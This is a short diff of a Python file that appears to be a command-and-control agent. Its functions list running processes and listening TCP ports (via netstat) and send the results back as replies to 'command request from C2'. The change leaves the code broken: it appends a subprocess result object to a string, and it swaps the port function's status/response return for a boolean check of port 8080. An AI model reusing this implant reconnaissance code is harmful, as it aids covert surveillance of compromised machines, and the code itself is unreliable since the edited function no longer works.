@@ -131,17 +131,26 @@ def list_running_processes():
                 # Handle any other exceptions
                 response += f"{pid:<{pid_w}} {'<Error>':<{name_w}} {'n/a':<{status_w}} {'n/a':<{memory_w}} {'n/a':<{cpu_w}} {str(e):<{error_w}}\n"
 
-    response += "\n*Running Processes*\n"
+    response += "\n*Running Processes End*\n"
     return MESSAGE_STATUS_OK, response
 
 
 def list_listening_tcp_ports():
     # Will list listening TCP ports and their processes
+
     response = f"* Listening TCP ports: *\n\n"
+
     result = subprocess.run(['netstat', '-ltnp'], capture_output=True, text=True)
-    response += result.stdout
-    response += "\n*Listening TCP ports*\n"
-    return MESSAGE_STATUS_OK, response
+    response += result
+
+    response += "\n*Listening TCP ports End*\n"
+
+    print(response)
+    # Check for port 8080 in the result
+    for line in result.stdout.splitlines():
+        if ':8080' in line and 'python' in line:
+            return True
+    return False
 
 
 # functions to handle the command request from C2
